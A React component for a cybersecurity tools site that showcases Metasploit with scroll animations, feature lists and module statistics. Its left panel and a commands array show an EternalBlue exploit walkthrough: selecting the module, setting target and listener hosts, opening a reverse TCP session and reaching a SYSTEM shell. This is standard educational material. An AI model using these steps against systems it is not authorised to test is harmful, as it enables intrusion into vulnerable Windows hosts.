import { useEffect, useRef } from 'react';
import { gsap } from 'gsap';
import { ScrollTrigger } from 'gsap/ScrollTrigger';
import { ArrowRight, Zap, Target, Layers, Terminal, ExternalLink } from 'lucide-react';

gsap.registerPlugin(ScrollTrigger);

interface FeaturedToolProps {
  onToolSelect: (toolId: string) => void;
}

const FeaturedTool = ({ onToolSelect }: FeaturedToolProps) => {
  const sectionRef = useRef<HTMLElement>(null);
  const leftPanelRef = useRef<HTMLDivElement>(null);
  const centerPanelRef = useRef<HTMLDivElement>(null);
  const rightPanelRef = useRef<HTMLDivElement>(null);

  const scrollToToolsHub = () => {
    const hub = document.querySelector('#kali-hub');
    if (hub) {
      hub.scrollIntoView({ behavior: 'smooth' });
    }
  };

  useEffect(() => {
    const section = sectionRef.current;
    const leftPanel = leftPanelRef.current;
    const centerPanel = centerPanelRef.current;
    const rightPanel = rightPanelRef.current;

    if (!section || !leftPanel || !centerPanel || !rightPanel) return;

    const ctx = gsap.context(() => {
      const scrollTl = gsap.timeline({
        scrollTrigger: {
          trigger: section,
          start: 'top top',
          end: '+=130%',
          pin: true,
          scrub: 0.6,
        },
      });

      // ENTRANCE (0% - 30%)
      scrollTl
        .fromTo(
          leftPanel,
          { opacity: 0, x: '-55vw', rotateY: 18 },
          { opacity: 1, x: 0, rotateY: 0, ease: 'none' },
          0
        )
        .fromTo(
          rightPanel,
          { opacity: 0, x: '55vw', rotateY: -18 },
          { opacity: 1, x: 0, rotateY: 0, ease: 'none' },
          0
        )
        .fromTo(
          centerPanel,
          { opacity: 0, scale: 0.92, y: '10vh' },
          { opacity: 1, scale: 1, y: 0, ease: 'none' },
          0.05
        );

      // EXIT (70% - 100%)
      scrollTl
        .fromTo(
          leftPanel,
          { opacity: 1, x: 0, rotateY: 0 },
          { opacity: 0.25, x: '-18vw', rotateY: 10, ease: 'power2.in' },
          0.7
        )
        .fromTo(
          rightPanel,
          { opacity: 1, x: 0, rotateY: 0 },
          { opacity: 0.25, x: '18vw', rotateY: -10, ease: 'power2.in' },
          0.7
        )
        .fromTo(
          centerPanel,
          { opacity: 1, scale: 1, y: 0 },
          { opacity: 0.25, scale: 0.98, y: '-6vh', ease: 'power2.in' },
          0.7
        );
    }, section);

    return () => ctx.revert();
  }, []);

  const features = [
    { icon: Zap, text: 'Payload generation & delivery' },
    { icon: Target, text: 'Post-exploit automation' },
    { icon: Layers, text: 'Integration with Nmap & Nessus' },
  ];

  const commands = [
    { cmd: 'msfconsole', desc: 'Launch Metasploit' },
    { cmd: 'search eternalblue', desc: 'Search for exploits' },
    { cmd: 'use exploit/windows/smb/ms17_010_eternalblue', desc: 'Select exploit' },
    { cmd: 'set RHOSTS 192.168.1.100', desc: 'Set target' },
    { cmd: 'exploit', desc: 'Execute attack' },
  ];

  return (
    <section
      ref={sectionRef}
      id="featured-tool"
      className="relative w-full h-screen flex items-center justify-center overflow-hidden"
    >
      {/* Three Panel Layout */}
      <div className="relative w-full h-full flex items-center justify-center px-4 lg:px-8 py-10">
        <div className="flex flex-col lg:flex-row gap-4 lg:gap-5 w-full max-w-[1600px] h-full max-h-[800px]">
          {/* Left Panel - Code Demo */}
          <div
            ref={leftPanelRef}
            className="hidden lg:block flex-1 cyber-panel overflow-hidden"
            style={{ perspective: '1000px', willChange: 'transform, opacity' }}
          >
            <div className="relative w-full h-full bg-gradient-to-br from-[#0B0E16] to-[#11141D] p-4">
              <div className="flex items-center justify-between mb-4">
                <span className="text-xs font-mono text-[#A7B0BC]">msfconsole</span>
                <span className="text-xs font-mono text-[#39FF14]">v6.3.4</span>
              </div>
              
              <div className="font-mono text-xs space-y-1">
                <div className="text-[#39FF14]">msf6 &gt; search eternalblue</div>
                <div className="text-[#A7B0BC]">...</div>
                <div className="text-[#F2F5F9]">0 exploit/windows/smb/ms17_010_eternalblue</div>
                <div className="text-[#39FF14]">msf6 &gt; use 0</div>
                <div className="text-[#00F0FF]">[*] Using configured payload windows/x64/meterpreter/reverse_tcp</div>
                <div className="text-[#39FF14]">msf6 exploit(...) &gt; set RHOSTS 192.168.1.100</div>
                <div className="text-[#F2F5F9]">RHOSTS =&gt; 192.168.1.100</div>
                <div className="text-[#39FF14]">msf6 exploit(...) &gt; set LHOST 192.168.1.50</div>
                <div className="text-[#F2F5F9]">LHOST =&gt; 192.168.1.50</div>
                <div className="text-[#39FF14]">msf6 exploit(...) &gt; exploit</div>
                <div className="text-[#00F0FF]">[*] Started reverse TCP handler on 192.168.1.50:4444</div>
                <div className="text-[#00F0FF]">[*] 192.168.1.100:445 - Connecting to target...</div>
                <div className="text-[#39FF14]">[+] 192.168.1.100:445 - Connection established</div>
                <div className="text-[#39FF14]">[+] 192.168.1.100:445 - ETERNALBLUE overwrite completed</div>
                <div className="text-[#00F0FF]">[*] Command shell session 1 opened</div>
                <div className="text-[#F2F5F9]">Microsoft Windows [Version 6.1.7601]</div>
                <div className="text-[#F2F5F9]">C:\Windows\system32&gt; whoami</div>
                <div className="text-[#39FF14]">nt authority\system</div>
                <div className="text-[#F2F5F9]">C:\Windows\system32&gt; <span className="animate-pulse">_</span></div>
              </div>

              <div className="absolute bottom-0 left-0 right-0 h-32 bg-gradient-to-t from-[#0B0E16] to-transparent" />
              <div className="absolute bottom-0 left-0 right-0 h-32 bg-gradient-to-t from-[rgba(57,255,20,0.1)] to-transparent" />
            </div>
          </div>

          {/* Center Panel - Content */}
          <div
            ref={centerPanelRef}
            className="flex-1 lg:flex-[1.2] cyber-panel p-6 lg:p-10 flex flex-col justify-center"
            style={{ willChange: 'transform, opacity' }}
          >
            {/* Eyebrow */}
            <div className="flex items-center gap-2 mb-4">
              <span className="w-2 h-2 rounded-full bg-[#39FF14] animate-pulse" />
              <span className="text-xs font-mono text-[#39FF14] uppercase tracking-wider">
                Featured Tool
              </span>
            </div>

            {/* Title */}
            <h2 className="text-4xl lg:text-5xl xl:text-6xl font-bold text-[#F2F5F9] mb-6">
              METASPLOIT
            </h2>

            {/* Description */}
            <p className="text-base lg:text-lg text-[#A7B0BC] mb-8 leading-relaxed">
              A modular exploitation framework used from initial access to
              post-exploitation. Build payloads, automate tasks, and integrate
              with your recon workflow. The industry standard for penetration
              testing with over 4,700 exploits and 1,500 payloads.
            </p>

            {/* Features List */}
            <div className="space-y-4 mb-8">
              {features.map((feature, index) => {
                const Icon = feature.icon;
                return (
                  <div
                    key={index}
                    className="flex items-center gap-3 text-[#F2F5F9]"
                  >
                    <div className="p-1.5 bg-[rgba(57,255,20,0.1)] rounded border border-[rgba(57,255,20,0.2)]">
                      <Icon className="w-4 h-4 text-[#39FF14]" />
                    </div>
                    <span className="text-sm">{feature.text}</span>
                  </div>
                );
              })}
            </div>

            {/* Quick Commands */}
            <div className="mb-6 p-4 bg-[#05060B] rounded-lg border border-[rgba(243,245,249,0.08)]">
              <h4 className="text-xs font-mono uppercase tracking-wider text-[#A7B0BC] mb-3">
                Quick Reference
              </h4>
              <div className="space-y-2">
                {commands.slice(0, 3).map((cmd, idx) => (
                  <div key={idx} className="flex items-center gap-3 text-xs">
                    <code className="font-mono text-[#00F0FF]">{cmd.cmd}</code>
                    <span className="text-[#A7B0BC]">- {cmd.desc}</span>
                  </div>
                ))}
              </div>
            </div>

            {/* CTAs */}
            <div className="flex flex-col sm:flex-row gap-4">
              <button
                onClick={scrollToToolsHub}
                className="cyber-btn flex items-center justify-center gap-2"
              >
                <ArrowRight className="w-4 h-4" />
                Browse All Tools
              </button>

              <button 
                onClick={() => onToolSelect('metasploit')}
                className="cyber-btn-primary flex items-center justify-center gap-2"
              >
                <Terminal className="w-4 h-4" />
                View Full Guide
                <ArrowRight className="w-4 h-4" />
              </button>
              
              <a
                href="https://www.metasploit.com"
                target="_blank"
                rel="noopener noreferrer"
                className="cyber-btn flex items-center justify-center gap-2"
              >
                <ExternalLink className="w-4 h-4" />
                Official Site
              </a>
            </div>

            {/* Metadata */}
            <div className="mt-8 pt-6 border-t border-[rgba(243,245,249,0.08)] flex flex-wrap gap-4 text-xs font-mono text-[#A7B0BC]">
              <span className="flex items-center gap-1.5">
                <span className="w-1.5 h-1.5 rounded-full bg-[#00F0FF]" />
                Difficulty: Intermediate
              </span>
              <span className="flex items-center gap-1.5">
                <span className="w-1.5 h-1.5 rounded-full bg-[#FFE600]" />
                Time: 12 min
              </span>
              <span className="flex items-center gap-1.5">
                <span className="w-1.5 h-1.5 rounded-full bg-[#39FF14]" />
                4700+ exploits
              </span>
            </div>
          </div>

          {/* Right Panel - Module Stats */}
          <div
            ref={rightPanelRef}
            className="hidden lg:block flex-1 cyber-panel overflow-hidden"
            style={{ perspective: '1000px', willChange: 'transform, opacity' }}
          >
            <div className="relative w-full h-full bg-gradient-to-bl from-[#0B0E16] to-[#11141D] p-4">
              <div className="flex items-center justify-between mb-4">
                <span className="text-xs font-mono text-[#A7B0BC]">Module Statistics</span>
                <span className="text-xs font-mono text-[#39FF14]">Live</span>
              </div>

              <div className="space-y-4">
                {[
                  { name: 'exploits', count: 2500, color: '#FF2D2D' },
                  { name: 'auxiliary', count: 1200, color: '#FFE600' },
                  { name: 'post', count: 400, color: '#00F0FF' },
                  { name: 'payloads', count: 600, color: '#39FF14' },
                  { name: 'encoders', count: 45, color: '#7C3AED' },
                  { name: 'nop', count: 10, color: '#FF6B00' },
                ].map((item) => (
                  <div key={item.name} className="space-y-1">
                    <div className="flex items-center justify-between text-xs">
                      <span className="font-mono uppercase" style={{ color: item.color }}>
                        {item.name}
                      </span>
                      <span className="text-[#A7B0BC]">{item.count.toLocaleString()}</span>
                    </div>
                    <div className="h-2 bg-[rgba(243,245,249,0.05)] rounded-full overflow-hidden">
                      <div
                        className="h-full rounded-full transition-all duration-1000"
                        style={{
                          width: `${(item.count / 2500) * 100}%`,
                          backgroundColor: item.color,
                          opacity: 0.7,
                        }}
                      />
                    </div>
                  </div>
                ))}
              </div>

              <div className="mt-6 pt-4 border-t border-[rgba(243,245,249,0.08)]">
                <div className="grid grid-cols-2 gap-4">
                  <div>
                    <div className="text-xs text-[#A7B0BC] mb-1">Total Modules</div>
                    <div className="text-2xl font-bold text-[#39FF14] font-mono">
                      4,755
                    </div>
                  </div>
                  <div>
                    <div className="text-xs text-[#A7B0BC] mb-1">Last Updated</div>
                    <div className="text-sm text-[#F2F5F9] font-mono">
                      2 days ago
                    </div>
                  </div>
                </div>
              </div>

              <div className="absolute inset-0 pointer-events-none shadow-[inset_0_0_60px_rgba(57,255,20,0.05)]" />
            </div>
          </div>
        </div>
      </div>
    </section>
  );
};

export default FeaturedTool;
